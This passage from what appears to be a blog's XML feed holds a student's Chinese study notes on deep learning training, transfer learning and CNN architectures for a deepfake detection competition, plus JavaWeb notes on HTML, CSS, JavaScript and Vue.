<li>大多数x86微处理器，以及这些机器上安装的大多数操作系统，都是为运行x86-64设计的，也可以向后兼容执行IA32程序</li>
</ul>
</li>
<li></li>
</ul>
]]></content>
      <categories>
        <category>notes</category>
        <category>CSAPP notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>【CV夏令营】Task 2</title>
    <url>/2024/07/15/CS_Notes/CV/%E3%80%90CV%E5%A4%8F%E4%BB%A4%E8%90%A5%E3%80%91Task-2/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p>111</p>
<h3 id="Part-2：深度学习的训练"><a class="header-anchor" href="#Part-2：深度学习的训练">¶</a>Part 2：深度学习的训练</h3>
<h4 id="梯度下降算法"><a class="header-anchor" href="#梯度下降算法">¶</a>梯度下降算法</h4>
<h5 id="原理"><a class="header-anchor" href="#原理">¶</a>原理</h5>
<p>损失函数的梯度指向函数增长最快的方向</p>
<p><img src="blob:https://datawhaler.feishu.cn/082aee3d-e48f-49a9-8b0e-b02844320472" alt="img"></p>
<h5 id="训练过程"><a class="header-anchor" href="#训练过程">¶</a>训练过程</h5>
<ul>
<li>首先加载一小批量数据，将其输入到神经网络中进行前向传播，计算出网络的输出</li>
<li>然后使用损失函数来计算当前批次的损失，并通过反向传播算法计算损失函数关于每个参数的梯度。</li>
<li><strong>梯度</strong>→如何<strong>调整权重和偏置</strong>以减少损失。</li>
<li>当数据集非常大时，一次性处理所有数据可能会导致内存不足或计算过于缓慢。通过将数据<strong>分成小批量</strong>，可以更<strong>频繁地更新模型参数</strong>，这使得训练过程更加高效</li>
</ul>
<h4 id="Pytorch训练代码"><a class="header-anchor" href="#Pytorch训练代码">¶</a>Pytorch训练代码</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">事先准备：</span></span><br><span class="line"><span class="string">一批图片数据（通过train_loader）和这些图片对应的正确标签（target）</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">train</span>(<span class="params">train_loader, model, criterion, optimizer, epoch</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># switch to train mode  将模型设置为训练模式</span></span><br><span class="line">    model.train()</span><br><span class="line">    </span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="keyword">for</span> i, (<span class="built_in">input</span>, target) <span class="keyword">in</span> <span class="built_in">enumerate</span>(train_loader):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;给模型喂图片数据，让它尝试预测这些图片的内容&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">input</span> = <span class="built_in">input</span>.cuda(non_blocking=<span class="literal">True</span>)</span><br><span class="line">        target = target.cuda(non_blocking=<span class="literal">True</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># compute output</span></span><br><span class="line">        output = model(<span class="built_in">input</span>)  <span class="comment"># 预测结果</span></span><br><span class="line">        loss = criterion(output, target)  <span class="comment"># 预测结果与实际标签之间的差异</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># -------更新内部参数来减少错误|模型自我调整------</span></span><br><span class="line">        optimizer.zero_grad()</span><br><span class="line">        loss.backward()</span><br><span class="line">        optimizer.step()</span><br></pre></td></tr></table></figure>
<ul>
<li>总结：（图像|文本|音频数据）的深度学习训练步骤
<ul>
<li>训练开始前，对数据进行加载、预处理和分割</li>
<li>涉及到数据加载器。其将数据集分成小批量，确保数据在训练过程中被正确地处理</li>
<li>训练代码包括：前向传播 | 计算损失 | 反向传播 | 参数更新</li>
<li>这个过程会重复进行多轮（epoch），直到模型性能达到预期目标</li>
</ul>
</li>
</ul>
<h3 id="Part-3：深度学习与迁移学习"><a class="header-anchor" href="#Part-3：深度学习与迁移学习">¶</a>Part 3：深度学习与迁移学习</h3>
<h4 id="概念"><a class="header-anchor" href="#概念">¶</a>概念</h4>
<ul>
<li>迁移学习是一种机器学习技术，它将已在一个任务上学到的知识（如模型参数、特征表示等）应用到另一个相关任务上。这种技术特别有用，因为它允许模型在数据稀缺的情况下也能表现出色。</li>
<li><strong>通常使用在大规模数据集上预训练的模型作为起点，例如在ImageNet数据集上预训练的卷积神经网络（CNN）。在预训练模型的基础上，使用少量标记数据对模型进行微调，以适应新任务</strong></li>
</ul>
<h4 id="使用到ImageNet"><a class="header-anchor" href="#使用到ImageNet">¶</a>使用到ImageNet</h4>
<ul>
<li>它的规模之大使得它成为深度学习模型训练和评估的理想数据集</li>
<li><a href="https://www.image-net.org/">https://www.image-net.org/</a></li>
<li>ImageNet 数据集中的图像包含了各种场景、物体、背景和遮挡情况，这为算法提供了极大的挑战。这种多样性使得在 ImageNet 上训练的模型能够学习到鲁棒的特征</li>
</ul>
<h4 id="迁移学习的实现方法"><a class="header-anchor" href="#迁移学习的实现方法">¶</a>迁移学习的实现方法</h4>
<h5 id="微调"><a class="header-anchor" href="#微调">¶</a>微调</h5>
<p>微调（Fine-tuning）是深度学习中一种有效的迁移学习策略，它允许我们利用预训练模型对特定任务进行优化</p>
<h6 id="基本原理"><a class="header-anchor" href="#基本原理">¶</a>基本原理</h6>
<ul>
<li>
<p>首先在一个大规模的数据集上<strong>预训练</strong>一个深度学习模型，捕捉<strong>通用的特征表示</strong></p>
</li>
<li>
<p>然后将这个预训练模型作为<strong>起点</strong>，在目标任务上进行进一步的训练以提升模型的性能</p>
</li>
</ul>
<h6 id="过程"><a class="header-anchor" href="#过程">¶</a>过程</h6>
<ul>
<li>通常开始于选择一个在大型数据集上预训练的模型，这个预训练模型已经学到了丰富的特征表示，这些特征在广泛的领域内都是通用的</li>
<li>接着，我们将这个预训练模型适配到新的目标任务上
<ul>
<li>替换模型的输出层，以匹配目标任务的类别数量和类型
<ul>
<li>例如，如果目标任务是图像分类，而预训练模型原本用于不同的分类任务，我们就需要将模型的最后一层替换成适合新任务类别数的新层</li>
</ul>
</li>
<li>【可做可不做】冻结预训练模型中的大部分层，这样可以防止在微调过程中这些层学到的通用特征被破坏。通常情况下，只对模型的最后一部分层进行解冻，这些层负责学习任务特定的特征</li>
<li>使用目标任务的数据集对模型进行训练。在这个过程中，我们会用梯度下降等优化算法更新模型的权重，从而使模型能够更好地适应新的任务。训练时，可能会使用比预训练时更低的学习率，以避免过度拟合目标数据集</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> timm</span><br><span class="line">model = timm.create_model(<span class="string">&#x27;resnet18&#x27;</span>, pretrained=<span class="literal">True</span>, num_classes=<span class="number">2</span>)  </span><br><span class="line"><span class="string">&quot;&quot;&quot;加载一个预训练的ResNet-18模型，pretrained=True表示使用在ImageNet数据集上预训练的权重，num_classes=2表示模型的输出层被修改为有2个类别的输出，以适应二分类任务（例如区分真实和Deepfake图像）&quot;&quot;&quot;</span></span><br><span class="line">model = model.cuda()  </span><br><span class="line"><span class="comment"># model = model.cuda()将模型移动到GPU上进行加速</span></span><br></pre></td></tr></table></figure>
<h3 id="Part-4：常见的图像分类网络"><a class="header-anchor" href="#Part-4：常见的图像分类网络">¶</a>Part 4：常见的图像分类网络</h3>
<ul>
<li>图像分类是计算机视觉中的一个基本任务，它涉及到将给定的图像分配到一个或多个预定义的类别中</li>
</ul>
<h4 id="AlexNet"><a class="header-anchor" href="#AlexNet">¶</a>AlexNet</h4>
<ul>
<li>
<p><a href="https://en.wikipedia.org/wiki/AlexNet">https://en.wikipedia.org/wiki/AlexNet</a></p>
</li>
<li>
<p>AlexNet包含八个层次结构，前五个是卷积层，其中一些后跟最大池化层，最后三个是全连接层。具体结构如下：</p>
<ol>
<li>卷积层：AlexNet的前五个层次都是卷积层，每个卷积层后面跟着一个ReLU激活函数，以引入非线性。这些卷积层旨在提取图像的特征。</li>
<li>局部响应归一化（LRN）：在某些卷积层后使用了局部响应归一化，这是一种提高模型泛化能力的正则化方法。</li>
<li>最大池化层：在部分卷积层之后使用最大池化层来降低特征的空间维度，减少计算量和过拟合的风险。</li>
<li>全连接层：网络的最后三个层次是全连接层，其中最后两个全连接层后跟有Dropout，以进一步防止过拟合。</li>
<li>输出层：最后一个全连接层后是线性层，然后是softmax激活函数，输出1000个类别上的概率分布。</li>
</ol>
</li>
</ul>
<h4 id="ResNet"><a class="header-anchor" href="#ResNet">¶</a>ResNet</h4>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Residual_neural_network">https://en.wikipedia.org/wiki/Residual_neural_network</a></li>
<li><strong>主要创新点</strong>：引入了残差学习的概念，允许训练非常深的网络，从而缓解了深度神经网络训练中的梯度消失和梯度爆炸问题</li>
<li><strong>核心</strong>：残差块（residual block），网络通过堆叠这些残差块来构建。一个基本的残差块包含以下几部分：
<ol>
<li>跳跃连接（Skip Connections）：这是ResNet最关键的创新，通过跳跃连接，输入可以直接绕过一个或多个层传到输出，输出是输入与这些层的输出的加和。这种结构使得网络可以学习输入到输出的残差，而不是直接学习输出，这有助于缓解梯度消失问题。</li>
<li>卷积层：残差块内部包含多个卷积层，通常使用小尺寸的卷积核（如3x3），并且通常会有批量归一化（Batch Normalization）和ReLU激活函数。</li>
<li>池化层：在某些残差块之间会插入最大池化层来降低特征图的空间维度。</li>
</ol>
</li>
<li>ResNet有多个变种，包括ResNet-50、ResNet-101、ResNet-152等，数字代表了网络中权重层的数量。这些变种在网络的深度和宽度上有所不同，但都基于相同的残差学习架构。<strong>ResNet能够成功训练超过100层的网络，这在之前是不可能实现的</strong></li>
</ul>
<h4 id="EfficientNet"><a class="header-anchor" href="#EfficientNet">¶</a>EfficientNet</h4>
<ul>
<li><a href="https://paperswithcode.com/method/efficientnet">https://paperswithcode.com/method/efficientnet</a></li>
<li>是一种高效的卷积神经网络（CNN）架构，它通过一种新颖的网络缩放方法来提升模型的性能和效率。</li>
<li><strong>核心</strong>:其 compound scaling 方法.
<ul>
<li>该方法通过一个复合系数统一缩放网络的深度、宽度和分辨率。</li>
<li>在过去，网络缩放通常是通过任意选择深度、宽度或分辨率的增加来实现的，而EfficientNet的方法则是通过一系列固定的缩放系数来同时增加这三个维度。
<ul>
<li>例如，如果想要使用更多的计算资源，可以通过增加网络深度、宽度和图像大小的特定比例来实现，其中的比例系数是通过在小型模型上进行小规模的网格搜索确定的</li>
</ul>
</li>
<li>EfficientNet的复合缩放方法的直觉在于，如果输入图像更大，网络就需要更多的层来增加感受野，以及更多的通道来捕捉更细粒度的模式。</li>
<li>EfficientNet的架构本质上并不复杂。基本的EfficientNet-B0网络作为后续缩放的基础。作者指出，他们使用NAS来构建基本网络，利用了多目标搜索来同时优化网络的准确性和计算效率</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>notes</category>
        <category>CV notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>CV</tag>
      </tags>
  </entry>
  <entry>
    <title>【CV夏令营】链接留档</title>
    <url>/2024/07/14/CS_Notes/CV/%E3%80%90CV%E5%A4%8F%E4%BB%A4%E8%90%A5%E3%80%91%E9%93%BE%E6%8E%A5%E7%95%99%E6%A1%A3/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p><a href="https://www.kaggle.com/competitions/multi-ffdi/submissions">Inclusion・The Global Multimedia Deepfake Detection | Kaggle</a>   比赛链接</p>
<ul>
<li>
<p>在本课程中，我们将深入探讨Deepfake技术的原理、应用案例以及检测方法。通过实践项目和案例研究，你们将有机会亲自动手，体验Deepfake技术的制作过程，并学习如何辨别Deepfake内容。</p>
</li>
<li>
<p>接下来我们会基于这个赛题进行更多的知识点学习，会涉及到：</p>
<ul>
<li>深度学习概念</li>
<li>AIGC 和 Deepfake的关系</li>
<li>深度学习模型原理</li>
<li>构建Deepfake攻防模型</li>
<li>数据集处理与增强</li>
</ul>
</li>
</ul>
<h3 id="Task-1：了解Deepfake-baseline提交"><a class="header-anchor" href="#Task-1：了解Deepfake-baseline提交">¶</a>Task 1：了解Deepfake &amp; baseline提交</h3>
<p><a href="https://datawhaler.feishu.cn/wiki/Uou8w9igsibGP7kduiycCgesnOh">‬‌‬‍⁠⁠‍‍‬‍﻿⁠‬⁠⁠‌‌⁠‌‬‌‌‌‌⁠‌‍‌⁠‌‬从零入门CV图像竞赛(Deepfake攻防) - 飞书云文档 (feishu.cn)</a></p>
<p><a href="https://datawhaler.feishu.cn/wiki/L4kKwgPqMiGFb4kmCKecKCpxnqd">Task1：了解Deepfake &amp; 初探baseline - 飞书云文档 (feishu.cn)</a></p>
<p><a href="https://www.kaggle.com/code/finlay/deepfake-ffdi-baseline/">Deepfake-FFDI-图像赛题 baseline (kaggle.com)</a></p>
<h3 id="Task-2：实现一个基于深度学习的Deepfake检测模型"><a class="header-anchor" href="#Task-2：实现一个基于深度学习的Deepfake检测模型">¶</a>Task 2：实现一个基于深度学习的Deepfake检测模型</h3>
<p><a href="https://datawhaler.feishu.cn/wiki/CsS2weZvgigEKok6IzycdiVunuy">‌﻿﻿﻿‬‌⁠‌‬﻿﻿‌‌‍⁠⁠﻿‌‌‌﻿﻿﻿‌‍⁠Task2：从baseline入门深度学习 - 飞书云文档 (feishu.cn)</a></p>
<p><a href="https://www.kaggle.com/code/finlay/deepfake-ffdi-ch2/">Deepfake-FFDI-图像赛题 ch2 (kaggle.com)</a>   实操代码地址</p>
<h3 id="Task-3："><a class="header-anchor" href="#Task-3：">¶</a>Task 3：</h3>
<p><a href="https://datawhaler.feishu.cn/wiki/Ad0jwNK8Eis5XwksFZ7cCvb6nHh">‍﻿‌⁠﻿﻿﻿‌‬‌﻿‍‬⁠⁠‌‍﻿‬‍‬‍‍⁠﻿‌‌Task3知识点文档 - 飞书云文档 (feishu.cn)</a></p>
<p><a href="https://www.kaggle.com/code/finlay/deepfake-ffdi-ch3">Deepfake-FFDI-图像赛题 ch3 (kaggle.com)</a></p>
]]></content>
      <categories>
        <category>notes</category>
        <category>CV notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>CV</tag>
      </tags>
  </entry>
  <entry>
    <title>【JavaWeb】Day01--HTML&amp;CSS</title>
    <url>/2024/08/21/CS_Notes/Java/%E3%80%90JavaWeb%E3%80%91Day01--HTML&amp;CSS/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<ul>
<li><a href="https://aigz8jy30yo.feishu.cn/docx/BtbOd3c5aotnpdxYTVDcnqQanxd">‍‌‍‍‬‬‌﻿﻿‌‌‬‬‌﻿⁠⁠‍‌⁠‬‍‍⁠‍‬⁠﻿‍JavaWeb 开发教程 - 飞书云文档 (feishu.cn)</a></li>
<li>需要记录的内容的标准：
<ul>
<li>已掌握的概念不记</li>
<li>太长的缩短记</li>
</ul>
</li>
<li>按照期末考前的笔记选择标准来记：
<ul>
<li>只记关键核心内容，有助于复习笔记时快速重温掌握</li>
<li>对于较长的内容，尽可能用自己的话复述</li>
</ul>
</li>
<li>努力克服完美强迫症</li>
<li><a href="https://www.runoob.com/vue3/vue3-tutorial.html">Vue3 教程 | 菜鸟教程 (runoob.com)</a></li>
<li><a href="https://element.eleme.cn/#/zh-CN">Element - 网站快速成型工具</a></li>
</ul>
<h2 id="Day01–HTML-CSS"><a class="header-anchor" href="#Day01–HTML-CSS">¶</a>Day01–HTML &amp; CSS</h2>
<ul>
<li>
<p>HTML负责网页结构（页面元素和内容）</p>
</li>
<li>
<p>CSS：负责网页的表现（页面元素的外观、位置等页面样式，如：颜色、大小等）</p>
</li>
<li>
<p>Day01  2.3.1 新浪新闻-标题实现</p>
<ul>
<li>用具体案例来分析怎么用html搭网页框架</li>
<li>如何用不同的html标签实现不同表现形式</li>
<li>CSS的不同样式引入形式
<ul>
<li>行内、内嵌和外联</li>
</ul>
</li>
<li>颜色的三种表示方法（+拾色器）</li>
<li>三种基本的CSS选择器【选取需设置样式的元素（标签）】
<ul>
<li><strong>元素（标签）选择器</strong>：作用于所有同名标签上</li>
<li><strong>id选择器</strong>：#id属性值   作用于指定id的标签上</li>
<li><strong>类选择器</strong>：.class属性值    作用于所有class的属性值和该名字一样的标签上</li>
</ul>
</li>
<li>超链接</li>
</ul>
</li>
<li>
<p>Day01  2.3.2 新浪新闻-正文实现</p>
<ul>
<li>视频标签<video>、音频标签<audio></audio></video></li>
<li>文本、段落格式标签</li>
<li>在正文排版中使用的几个CSS属性
<ul>
<li>text-indent: 设置段落的首行缩进</li>
<li>line-height: 设置行高</li>
<li>text-align: 设置对齐方式, 可取值为 left / center / right</li>
</ul>
</li>
<li>CSS的盒子模型：内容区域（content）、内边距区域（padding）、边框区域（border）、外边距区域（margin）→类比生活中的手机盒子</li>
<li>2.3.2.2  布局标签：<div><span>  及其特点</span></div></li>
</ul>
</li>
<li>
<p>2.4  表格标签<table>和常用属性</table></p>
<ul>
<li>行<tr>、单元格<td>、表头<th></th></td></tr></li>
</ul>
</li>
<li>
<p>2.5  表单标签<form>及其属性</form></p>
<ul>
<li>method→ 表单发送方式：GET POST</li>
<li>GET和POST的区别</li>
<li>表单项三个标签：<input><select></select><textarea></textarea></li>
<li><input>的type属性取值：
<ul>
<li>text | password | radio | checkbox | file | date/time/datetime-local | number | email | hidden | submit / reset / button | hidden</li>
</ul>
</li>
</ul>
</li>
<li>
<p>文档地址: <a href="https://www.w3school.com.cn/index.html">https://www.w3school.com.cn/index.html</a></p>
</li>
<li>
<p>Day01作业：<a href="https://heuqqdmbyk.feishu.cn/docx/JFs1dpMLGoVwyMxAHcGc0p0cn9c">‍‬⁠‬‍﻿⁠﻿‍‌‬﻿﻿⁠‬﻿⁠⁠‬‌⁠‌﻿﻿Day01-作业 - 飞书云文档 (feishu.cn)</a>  【完成了】</p>
</li>
</ul>
]]></content>
      <categories>
        <category>notes</category>
        <category>Java notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Java</tag>
        <tag>JavaWeb</tag>
      </tags>
  </entry>
  <entry>
    <title>【JavaWeb】Day02--JS-Vue</title>
    <url>/2024/09/09/CS_Notes/Java/%E3%80%90JavaWeb%E3%80%91Day02--JS-Vue/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<ul>
<li>
<p><a href="https://aigz8jy30yo.feishu.cn/docx/BtbOd3c5aotnpdxYTVDcnqQanxd">‍‌‍‍‬‬‌﻿﻿‌‌‬‬‌﻿⁠⁠‍‌⁠‬‍‍⁠‍‬⁠﻿‍JavaWeb 开发教程 - 飞书云文档 (feishu.cn)</a></p>
</li>
<li>
<p>需要记录的内容的标准：</p>
<ul>
<li>已掌握的概念不记</li>
<li>太长的缩短记</li>
</ul>
</li>
<li>
<p>按照期末考前的笔记选择标准来记：</p>
<ul>
<li>只记关键核心内容，有助于复习笔记时快速重温掌握</li>
<li>对于较长的内容，尽可能用自己的话复述</li>
</ul>
</li>
<li>
<p>努力克服完美强迫症</p>
</li>
<li>
<p><a href="https://www.runoob.com/vue3/vue3-tutorial.html">Vue3 教程 | 菜鸟教程 (runoob.com)</a></p>
</li>
<li>
<p><a href="https://element.eleme.cn/#/zh-CN">Element - 网站快速成型工具</a></p>
</li>
</ul>
<h2 id="Day02–JavaScript-Vue"><a class="header-anchor" href="#Day02–JavaScript-Vue">¶</a>Day02–JavaScript-Vue</h2>
<ul>
<li><a href="https://heuqqdmbyk.feishu.cn/docx/CzYOdkWfyoh74AxPR4UcHjbxnIc">‍‍⁠‬‌⁠⁠﻿﻿‌⁠‌⁠‌‬‌⁠‬﻿⁠‌﻿‬‬Day02-作业 - 飞书云文档 (feishu.cn)</a></li>
</ul>
<h3 id="将JS引入HTML的两种方式"><a class="header-anchor" href="#将JS引入HTML的两种方式">¶</a>将JS引入HTML的两种方式</h3>
<h3 id="1-3-JS基础语法规则"><a class="header-anchor" href="#1-3-JS基础语法规则">¶</a>1.3  JS基础语法规则</h3>
<ul>
<li>3种输出语句：window.alert() | document.write() | console.log()</li>
<li>变量
<ul>
<li>JS是弱类型语言→ 变量可以存放不同类型的值</li>
<li>变量命名规则</li>
<li>var | let | const</li>
<li>js数据类型：number | string | boolean | null | undefined
<ul>
<li>使用typeof函数可以返回数据类型</li>
</ul>
</li>
</ul>
</li>
<li>JS中的运算符 ： 算术运算符 | 赋值运算符 | 比较运算符 | 逻辑运算符 | 三元运算符
<ul>
<li>JS运算规则与Java的区别：\ == 和 ===</li>
</ul>
</li>
<li>JS是弱数据类型的语言→形参和返回值，都不需要类型声明</li>
</ul>
<h3 id="1-4-函数"><a class="header-anchor" href="#1-4-函数">¶</a>1.4 函数</h3>
<ul>
<li>
<p>两种定义函数的语法</p>
<ul>
<li>
<pre><code class="language-JavaScript">function add(a, b)&#123;
    return a + b;
&#125;
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- ```JavaScript</span><br><span class="line">  var functionName = function (参数1,参数2..)&#123;   </span><br><span class="line">          //要执行的代码</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

</code></pre>
</li>
<li>
<p>调用函数多传参：不影响函数正常调用，只需函数名正确即可</p>
</li>
</ul>
</li>
</ul>
<h3 id="1-5-JS对象"><a class="header-anchor" href="#1-5-JS对象">¶</a>1.5  JS对象</h3>
<ul>
<li>
<p>参考：<a href="https://www.w3school.com.cn/js/js_objects.asp">JavaScript 对象 (w3school.com.cn)</a></p>
</li>
<li>
<p>第一类：基本对象   1.5.1</p>
<ul>
<li>
<p>Array→定义数组用的     属性和方法</p>
</li>
<li>
<p>String→属性、方法</p>
</li>
<li>
<p>自定义对象</p>
</li>
<li>
<p>JSON→应用在前后台交互的数据载体、代替xml格式、代码演示json对象</p>
</li>
<li>
<pre><code class="language-javascript">// //定义json
    var jsonstr = '&#123;&quot;name&quot;:&quot;Tom&quot;, &quot;age&quot;:18, &quot;addr&quot;:[&quot;北京&quot;,&quot;上海&quot;,&quot;西安&quot;]&#125;';
    //alert(jsonstr.name);

    // //json字符串--js对象
    var obj = JSON.parse(jsonstr);
    //alert(obj.name);

    // //js对象--json字符串
    alert(JSON.stringify(obj));
</code></pre>
</li>
</ul>
</li>
<li>
<p>第二类：BOM对象，浏览器对象模型，和浏览器相关的几个对象    1.5.2</p>
<ul>
<li>通过操作BOM对象的相关属性或者函数来操作浏览器的部分功能</li>
<li>提供对象：<strong>Window</strong> | Navigator | Screen | History | <strong>Location</strong></li>
<li>Window对象
<ul>
<li>其方法、属性可以省略window.</li>
<li>window对象提供了获取其他BOM对象的属性：history | location | Navigator | Screen</li>
<li>window常用函数：alert() | comfirm() | setInterval() | setTimeout()</li>
</ul>
</li>
<li>Location对象及其属性</li>
</ul>
</li>
<li>
<p>第三类：DOM对象，JS将HTML文档中每一个标签都封装成一个对象</p>
<ul>
<li>DOM  Document Object Model   文档对象模型</li>
<li>封装的对象：Document | Element | Attribute | Text | Comment</li>
<li>HTML文档→DOM树的转换</li>
<li>学习DOM的作用：改变HTML元素的内容/样式 | 对HTML DOM事件作出反应 | 添加和删除HTML元素</li>
<li>学习DOM的核心：<strong>如何获取DOM中的元素对象</strong>（Element对象，即标签） | <strong>如何操作Element对象的属性</strong>（即标签的属性）
<ul>
<li>Element对象→通过Document对象获取    而Document对象→通过window对象获取document对象提供：获取Element元素对象的api   有四个  比较常用的有getElementById()</li>
</ul>
</li>
<li>操作Element对象的属性
<ul>
<li>通过查询文档 <a href="https://www.w3school.com.cn/jsref/index.asp">JavaScript 和 HTML DOM 参考手册 (w3school.com.cn)</a>  资料</li>
</ul>
</li>
</ul>
</li>
<li>
<p>1.5.4   案例实操：复选选项亮灯</p>
<ul>
<li>需求1：点亮灯泡→换图→操作图片的src属性→获取img标签对象</li>
<li>需求2：将所有的div标签的标签体内容后加上：very good 且为红色字体→先获取原有内容，再进行内容的追加</li>
<li>需求3：选中所有的复选框→通过name属性获得所有的checkbox标签→遍历所有checkbox标签→设置为选中状态</li>
<li>完整代码1.5.4.6</li>
</ul>
</li>
</ul>
<h3 id="1-6-JS事件"><a class="header-anchor" href="#1-6-JS事件">¶</a>1.6   JS事件</h3>
<ul>
<li>HTML事件：发生在HTML元素上的事情→
<ul>
<li>例如：按钮被点击onclick、鼠标移动到元素上、输入框失去焦点</li>
</ul>
</li>
<li>事件绑定
<ul>
<li>方式1：通过html标签中的事件属性进行绑定  <code>&lt;input type=&quot;button&quot; id=&quot;btn1&quot; value=&quot;事件绑定1&quot; onclick=&quot;on()&quot;&gt;</code></li>
<li>方式2：通过DOM中Element元素的事件属性进行绑定   <code>&lt;input type=&quot;button&quot; id=&quot;btn2&quot; value=&quot;事件绑定2&quot;&gt;</code>       <code>document.getElementById('btn2').onclick = function()&#123;alert(&quot;按钮2被点击了...&quot;);  &#125;</code></li>
</ul>
</li>
<li>常用事件
<ul>
<li>onclick→鼠标单击事件    |    onblur→元素失去焦点     |    onfocus→元素获得焦点    |   onload→某个页面或图像被完成加载    |   onsubmit→当表单提交时触发该事件     |    onmouseover→鼠标被移到某元素之上     |    onmouseout→鼠标从某元素移开</li>
</ul>
</li>
<li>案例：按钮操控灯亮暗
<ul>
<li>需求1： 点击 “点亮”按钮 点亮灯泡，点击“熄灭”按钮 熄灭灯泡→绑定单击事件on()和off()，进行图像变化→修改<img>的src</li>
<li>需求2： 输入框鼠标聚焦后，展示小写；鼠标离焦后，展示大写→给<input>标签绑定onfocus和onblur事件→获取原本输入框的内容，即使用<input>标签对象的value值</li>
<li>需求3：“全选”选中所有复选框，“反选”使所有复选框取消→给“全选”和“多选”按钮绑定事件checkAll()和reverse()→定义checkAll()和reverse()两个函数→将选中的框改为true/false</li>
</ul>
</li>
</ul>
<h3 id="2-Vue"><a class="header-anchor" href="#2-Vue">¶</a>2 Vue</h3>
<h4 id="快速入门"><a class="header-anchor" href="#快速入门">¶</a>快速入门</h4>
<ul>
<li>
<p>相对于html+css+js更高效的前端开发方式</p>
</li>
<li>
<p><strong>MVVM(Model-View-ViewModel)的前端开发思想</strong></p>
<ul>
<li>Model: 数据模型，特指前端中通过请求从后台获取的数据
<ul>
<li>通过Ajax来发起请求从后台获取</li>
</ul>
</li>
<li>View: 视图，用于展示数据的页面，可以理解成我们的html+css搭建的页面，但是没有数据
<ul>
<li>ElementUI框架来替代HTML+CSS来更加方便的搭建View</li>
</ul>
</li>
<li>ViewModel: 数据绑定到视图，负责将数据（Model）通过JavaScript的DOM技术，将数据展示到视图（View）上
<ul>
<li>侧重于ViewModel部分开发的vue前端框架，用来替代JavaScript的DOM操作</li>
</ul>
</li>
</ul>
</li>
<li>
<p>框架：一个半成品软件，是一套可重用的、通用的、软件基础代码模型。基于框架进行开发，更加快捷、更加高效</p>
</li>
<li>
<p>Vue对象的创建</p>
<ul>
<li>el:  用来指定哪儿些标签受 Vue 管理。 该属性取值 <code>#app</code> 中的 <code>app</code> 需要是受管理的标签的id属性值</li>
<li>data: 用来定义数据模型</li>
<li>methods: 用来定义函数</li>
</ul>
</li>
</ul>
<h4 id="Vue指令"><a class="header-anchor" href="#Vue指令">¶</a>Vue指令</h4>
<table>
<thead>
<tr>
<th>指令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>v-bind / :</td>
<td>为HTML标签绑定属性值，如设置 href , css样式等      2.3.1</td>
</tr>
<tr>
<td>v-model</td>
<td>在<strong>表单</strong>元素上创建双向数据绑定     2.3.1</td>
</tr>
<tr>
<td>v-on / @</td>
<td>为HTML标签绑定事件（必须是vue对象中声明的函数，在methods属性中定义的事件）     2.3.2</td>
</tr>
<tr>
<td>v-if</td>
<td>条件性的渲染某元素，判定为true时渲染,否则不渲染    2.3.3</td>
</tr>
<tr>
<td>v-else</td>
<td></td>
</tr>
<tr>
<td>v-else-if</td>
<td></td>
</tr>
<tr>
<td>v-show</td>
<td>根据条件展示某元素，区别在于切换的是display属性的值（不满足条件的代码依然存在，只是设置css样式来控制标签不去显示）</td>
</tr>
<tr>
<td>v-for</td>
<td>列表渲染，遍历容器的元素或者对象的属性</td>
</tr>
</tbody>
</table>
<h4 id="案例"><a class="header-anchor" href="#案例">¶</a>案例</h4>
<ul>
<li>将数据转换成表格的形式，呈现到页面上</li>
<li>使用到的：
<ul>
<li>v-for添加在tr标签</li>
<li>{ {  } }   插值表达式</li>
<li>索引从0开始，+1可用作编号</li>
<li>v-if判断</li>
</ul>
</li>
</ul>
<h4 id="生命周期"><a class="header-anchor" href="#生命周期">¶</a>生命周期</h4>
<h5 id="生命周期方法-钩子方法"><a class="header-anchor" href="#生命周期方法-钩子方法">¶</a>生命周期方法/钩子方法</h5>
<table>
<thead>
<tr>
<th>状态</th>
<th>阶段周期</th>
</tr>
</thead>
<tbody>
<tr>
<td>beforeCreate</td>
<td>创建前</td>
</tr>
<tr>
<td>created</td>
<td>创建后</td>
</tr>
<tr>
<td>beforeMount</td>
<td>挂载前</td>
</tr>
<tr>
<td><strong>mounted</strong></td>
<td>挂载完成</td>
</tr>
<tr>
<td>beforeUpdate</td>
<td>更新前</td>
</tr>
<tr>
<td>updated</td>
<td>更新后</td>
</tr>
<tr>
<td>beforeDestroy</td>
<td>销毁前</td>
</tr>
<tr>
<td>destroyed</td>
<td>销毁后</td>
</tr>
</tbody>
</table>
<ul>
<li>mounted声明周期的钩子函数，与methods同级
<ul>
<li>页面加载完成，vue对象创建并且完成了挂载，此时自动触发mounted所绑定的钩子函数，然后自动执行</li>
</ul>
</li>
</ul>
<h3 id="Day02-作业"><a class="header-anchor" href="#Day02-作业">¶</a>Day02-作业</h3>
